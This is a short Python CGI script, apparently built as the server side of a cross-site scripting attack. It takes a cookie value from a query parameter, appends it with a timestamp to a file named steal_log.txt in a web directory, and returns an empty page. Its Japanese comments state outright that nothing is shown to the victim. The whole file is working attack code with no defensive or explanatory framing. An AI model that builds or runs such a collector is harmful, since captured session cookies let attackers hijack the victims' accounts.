#!/usr/bin/env python3
import cgi
import datetime

print("Content-Type: text/html")
print()

# クエリパラメータ取得
form = cgi.FieldStorage()
cookie = form.getfirst("c", "")

# 日時付きで保存
with open("/var/www/html/purojitu/steal_log.txt", "a") as f:
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    f.write(f"[{now}] Cookie: {cookie}\n")

# レスポンス（被害者には何も表示しない）
print("<html><body></body></html>")

